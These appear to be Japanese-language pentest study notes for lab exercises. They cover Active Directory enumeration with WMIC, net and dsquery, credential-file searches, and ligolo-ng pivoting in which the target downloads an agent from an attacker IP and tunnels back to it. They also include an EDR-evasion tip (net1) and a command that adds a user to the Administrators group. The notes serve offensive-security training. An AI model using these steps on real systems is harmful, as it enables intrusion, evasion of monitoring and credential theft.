- ローカルおよびリモートのホストに対して、情報の取得や管理タスクの実行を行うことができる
PowerShellで実行する

| **コマンド**                                                                               | **説明**                                               |     |
| -------------------------------------------------------------------------------------- | ---------------------------------------------------- | --- |
| wmic qfe get Caption,Description,HotFixID,Installed                                    | ホストに適用されているパッチやホットフィックスの概要と適用日時を表示する                 |     |
| wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:L        | ホストに関する基本情報（ホスト名、ドメイン、製造元、モデル、ユーザー名、役割など）を表示する       |     |
| wmic process list /format:                                                             | ホスト上で実行中のすべてのプロセスの一覧を表示する                            |     |
| wmic ntdomain list /format                                                             | ドメインおよびドメインコントローラーに関する情報を表示する                        |     |
| wmic useraccount list /forma                                                           | ホスト上のすべてのローカルアカウント、ならびに過去にログインしたドメインアカウントに関する情報を表示する |     |
| wmic group list /form                                                                  | すべてのローカルグループに関する情報を表示する                              |     |
| wmic sysaccount list /for                                                              | サービスアカウントとして使用されているシステムアカウントに関する情報を出力する              |     |
| wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress | **現在のドメインが信頼関係を持つドメインや子ドメイン、外部フォレスト**に関する情報を取得       |     |

#### ドメインからの列挙
- ドメインから情報を列挙（enumerate）する際に非常に役立つツール
- ローカルホストおよびリモートホストの両方に対してクエリを実行することができ、機能的には WMI と似たような使い方ができる
	- ローカルおよびドメインユーザー
	- グループ
	- ホストの一覧
	- 特定グループに所属するユーザー
	- ドメインコントローラー
	- パスワードポリシーな度がわかる
注意点
- net.exe を使ったコマンドは EDR（Endpoint Detection and Response）によって監視されていることが多いので、バレたり、ブロックされる可能性も全然ある
- でも`net`の代わりに`net1`を使うことで、netと同じことをすることができる
	- `net1`は、互換性のために残されているコマンドで、アラートとかに乗っかりにくいかもしれない


| **コマンド**                                   | **説明**                                              |
| ------------------------------------------ | --------------------------------------------------- |
| net accounts                               | パスワードの要件に関する情報                                      |
| net accounts /domain                       | パスワードとアカウントロックアウトのポリシー                              |
| **net group /domain**                      | ドメイングループに関する情報                                      |
| net group "Domain Admins" /domain          | ドメイン管理者権限を持つユーザーの一覧                                 |
| net group "domain computers" /domain       | ドメインに参加しているPCの一覧                                    |
| net group "Domain Controllers" /domain     | ドメインコントローラーのPCアカウント一覧                               |
| net group <グループ名> /domain                  | 指定したグループに所属しているユーザー                                 |
| net groups /domain                         | ドメイングループの一覧                                         |
| net localgroup                             | 使用可能なローカルグループの一覧                                    |
| net localgroup administrators /domain      | ドメイン内の管理者グループに所属するユーザー一覧（※通常 “Domain Admins” も含まれる） |
| net localgroup Administrators              | ローカル「Administrators」グループの情報                         |
| net localgroup administrators [ユーザー名] /add | 指定ユーザーを Administrators グループに追加                      |
| net share                                  | 現在の共有フォルダの確認                                        |
| net user <アカウント名> /domain                  | ドメイン内の特定ユーザーの情報取得                                   |
| net user /domain                           | ドメイン内のすべてのユーザーを一覧表示                                 |
| net user /domain <ユーザーネーム>                 | ドメイン内のユーザーの詳細情報を表示する                                |
| net user %username%                        | 現在ログインしているユーザーの情報                                   |
| net use x: \\コンピュータ名\共有名                   | 指定された共有をローカルにマウント                                   |
| net view                                   | コンピュータの一覧取得                                         |
| net view /all /domain[:ドメイン名]              | ドメイン内のすべての共有リソース一覧                                  |
| net view \\コンピュータ名 /ALL                    | 指定したコンピュータの共有リソース一覧                                 |
| net view /domain                           | ドメイン内のPC一覧                                          |

##### Dsquery
- Active Directory オブジェクトを検索するための便利なコマンドラインツール
- このツールで実行するクエリは、BloodHound や PowerView といった他のツールでも再現可能ですが、常にそういったツールを利用できるとは限らない
- Active Directory Domain Services のロールがインストールされているホストには dsquery が存在していることがある
	- dsquery.dll は最新のWindows環境であればデフォルトで`C:\Windows\System32\dsquery.dll`に存在する
- Dsquery DLLについて
	- dsquery を使用するには、ホスト上で昇格権限（管理者権限）を持っているか、SYSTEMコンテキストでコマンドプロンプトやPowerShellを実行できる必要がある

ユーザー検索
```powershell-session
PS C:\htb> dsquery user
```

ホストの検索
```powershell-session
PS C:\htb> dsquery computer
```

ワイルドカードを使った検索
```powershell-session
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

LDAP検索フィルターと組み合わせて、より詳細で条件を絞った検索を行うことができる
**userAccountControl 属性に PASSWD_NOTREQD（パスワード不要）フラグが設定されたユーザー**を検索するコマンド
```sh
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

  distinguishedName                                                                              userAccountControl
  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      66080
  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           546
  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           544
  CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080
  CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                         2080
```
上のコマンドの詳細
- 出力されるuserAccountは、それぞれのフラグの足し算なので、以下を見て、分解すればどのアカウントがどのフラグが立っているかがわかる
userAccountControlのフラグの一覧
- https://learn.microsoft.com/ja-jp/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties#list-of-property-flags

- 発見次第、除外すべきアカウント
	- 「CN=Guest」 : ゲストアカウント。基本的に無効化されてることが多いから、激アツではない
	- 「CN=XXX`$`」: `$`がついているので、コンピュータアカウント。コンピュータアカウントにPASSWD_NOTREQDが付いてるのは普通なので激アツではない。

さらに確認すべきポイント
- dsquery で気になるユーザーが見つかったら、次にそのアカウントが実際にログオン可能な状態かどうかを確認するのが重要
注意点
- net user "氏名" /domain のようにスペースを含むフルネーム（CN）を使って net user を実行すると、エラーになることがある。
- これは net user が sAMAccountName（ログオン名） を必要とするため
そのため、対象ユーザーのログオン名を調べるには、以下のように sAMAccountName を取得する
```sh
dsquery * -filter "(&(objectCategory=person)(cn=Yolanda Groce))" -attr sAMAccountName
```

得られたログオン名(yolandag)を使って、以下のように net user で詳細情報を確認する
```sh
net user yolandag /domain
```

- こうすることで、アカウントが有効かどうか・グループ所属・ログオン可能かどうかをチェックでき、そこからパスワードスプレーやKerberoastingなど、次の攻撃ステップに進む判断材料になる。


LDAP OIDマッチングルール一覧

|**OID値**|**名前（非公式）**|**意味・用途**|**使用例・特徴**|
|---|---|---|---|
|1.2.840.113556.1.4.803|Bitwise AND 完全一致|**指定したビット値に完全一致する属性のみを検索**|単一のUAC属性にマッチさせたいときに使う（例：PASSWD_NOTREQDが設定されている）|
|1.2.840.113556.1.4.804|Bitwise OR 部分一致|**ビット値のいずれかが一致すれば対象に含める**|複数の属性が混在しているオブジェクトを柔軟に検索できる|
|1.2.840.113556.1.4.1941|DNツリー探索|**オブジェクトの所有関係やグループメンバーシップなどを辿って検索**|ネストされたグループメンバーなどを再帰的に検索するときに便利|
### Linux


# その他

## フラグの検索
### Linux

- ファイル名が`user.txt`の場合
```bas
find / -type f -iname "user.txt" 2>/dev/null
```

- ファイル名が`root.txt`の場合
```bash
find / -type f -iname "root.txt" 2>/dev/null
```

`grep`を使用して特定の文字列を含むファイルを検索
- `user`という文字列を検索（大文字・小文字を無視）
```bash
grep -ri "user" / 2>/dev/null
```
- `root`という文字列を検索（大文字・小文字を無視）
```bash
grep -ri "root" / 2>/dev/null
```

クレデンシャルファイルの検索
```shell-session
find /mnt/Finance/ -name *cred*
```

```shell-session
grep -rn /mnt/Finance/ -ie cred
```
### Windows

Cドライブ全体を検索する場合  
- CMD
```cmd
dir C:\flag.txt /s
```

```Powershell
dir -Recurse -Filter flag.txt 2>$null
```
- PowerShell
クレデンシャルファイルの検索
```powershell-session
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

## ligolo-ng
- https://docs.ligolo.ng/Quickstart/

### 1. 必要なリソースのダウンロード
```sh
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8/ligolo-ng_proxy_0.8_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_0.8_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8/ligolo-ng_agent_0.8_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8/ligolo-ng_agent_0.8_windows_amd64.zip
unzip ligolo-ng_agent_0.8_windows_amd64.zip
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8/ligolo-ng_proxy_0.8_linux_arm64.tar.gz
tar -xzf ligolo-ng_proxy_0.8_linux_arm64.tar.gz

python -m http.server 8081
```

### 2. 攻撃者サーバー での設定
```sh
sudo ./proxy -selfcert
```
- device or resource busy というエラーが出た場合は、攻撃者マシンの**別のターミナル**で `sudo ip link delete ligolo0` を実行してから再度試す

仮想NICの作成
```sh
interface_create --name ligolo0
```
### 3.ターゲット側の設定
#### Linux
ダウンロード
```sh
wget http://10.10.14.4:8081/agent
```

wgetがない場合
```sh
curl -o agent http://10.10.14.62:8081/agent
```

実行
```sh
./agent -connect <C2サーバーのIPまたはドメイン>:11601 -ignore-cert
```

#### Windows
```PS
powershell .\agent.exe -connect <攻撃者サーバーのIPアドレス>:11601 -ignore-cert
```

### 4.攻撃者側での設定
- proxy を起動すると、プロンプトが表示されます。Agentが接続してくると、proxyのコンソールに通知があります。
 ```sh
session
tunnel_start --tun ligolo0
ifconfig
```
- ifconfigは、ターゲットの内部ネットワーク情報の確認のために行う、攻撃者のNICではない。
	- 例えば、eth0 インターフェースに 172.16.1.100/24 と表示されていれば、ターゲットの内部ネットワークは 172.16.1.0/24

別のターミナルで
```sh
sudo ip route add <ターゲットの内部ネットワークCIDR(例 :  172.16.1.0/24)> dev ligolo0
```

### 5. 内部ネットワークの調査
ここから、内部ネットワークの攻撃は、内部ネットワークのIPになる
例えば、攻撃者側でssh入って、ifconfigしたときのipアドレスで、攻撃者側からnmapとかpingができるっていう話
```sh
nmap -sT <内部ネットワーク内のIPアドレス 例: 172.16.1.1>
```

- Ligolo-ngを使ってる時は、`nmap -sn`だとエラーが起きる
	- `nmap -PE -sn `でエラーを防ぐことができつつ、ICMPエコーリクエストのみで調査できる
```sh
nmap -PE -sn <ターゲットの内部ネットワークCIDR>
```


## 内部ファイルの持ち出し
 [[File Transfer]]
## 内部ファイルの暗号化
[[File Encryption]]
## Windowsローカルパスワード攻撃
[[Windows Local Password Attack]]
- パスワードハッシュを取得して、ハッシュをクラックすることによって、パスワードを不正に取得する
## ActiveDirectory
[[Pentest_Technique/Active Directory]]